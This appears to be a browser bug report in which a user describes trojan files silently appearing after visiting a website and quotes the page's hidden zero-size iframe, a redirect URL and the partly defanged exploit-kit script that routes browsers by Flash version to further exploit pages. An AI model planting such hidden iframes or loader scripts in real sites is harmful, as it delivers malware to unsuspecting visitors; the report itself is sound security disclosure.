Go to site http://www.dsstester.com. Antivirus program alarm, there are two seemingly identical files that have just appeared in my C:\Documents and Settings\(user)\Application Data folder named a.exe and b.exe, both are detected by avast! AV. I deleted both a.exe and b.exe, reloaded the site, they are back.  

There is an iframe at the very bottom of that site, 

(code)
45

<iframe width='0' height='0' src='http://www.qidundec.com/'></iframe>

0
(/code)

Which contains:

Object Moved</h1>This object may be found (a HREF="http://shop.ingilizce.tk/DLL/DLL%20CALLER/_notes/1/index.htm")here

Which contains script as follows (some html tags replaced by me in hopes the script won't run):  

(script>

window.status='';

if(navigator.userAgent.toLowerCase().indexOf("\x6D\x73\x69\x65 \x38")!=-1)

location.replace("\x61\x62\x6F\x75\x74\x3A\x62\x6C\x61\x6E\x6B");

</script>

<script type="text/javascript" src="swfobject.js"></script>

(script>

var version = deconcept.SWFObjectUtil.getPlayerVersion();  

if(version['major']>=10 && version['rev']>31 || version['major']<9)

{document.write("<iframe frameborder=0 src=" + "ie7.htm width=468 height=60 scrolling=no></iframe>");

document.write("<iframe frameborder=0 src=" + "BDA.htm width=468 height=60 scrolling=no></iframe>");}

else{

if(navigator.userAgent.toLowerCase().indexOf("msie")>0)

{

document.write("<iframe src=ie.html frameborder=0 width=468 height=60></iframe>");

}

else{document.write("<iframe src=ff.html frameborder=0 width=468 height=60></iframe>");}

}

(/script>





which investigation shows is the likely source of the trojan. 

Several repeats of this show the same result, a clear browser exploit.  I was running an older version, I downloaded and upgraded to the latest version of Firefox and the result was the same. 

Reproducible: Always

Steps to Reproduce:
1.Go to http://dsstester.com
2.AV program alarms
3.AV program wants to quarantine a.exe and b.exe which are same size in my C:\Documents and Settings\(user)\Application Data folder
4.Upgraded to latest version. 
5 Test result the same. 
Actual Results:  
My AV program detected the two trojan files. It is unknown whatever else the browser exploit could have allowed this site to do to my computer. That bears testing by someone who is much better at this than I and more equipped, perhaps with a virtual system so the actual exploit can be logged and researched. 

I would be interested if someone does find something else this did to me, so I can clean it up if necessary. 

Expected Results:  
I don't expect files to be silently downloaded by my browser which I have neither asked for nor approved. 

This is a very serious browser exploit in firefox, and it affects the latest version at the time I tested it.  I did not test this with IE. 

I am submitting this as a confidential security problem.  If that's not correct please let me know.
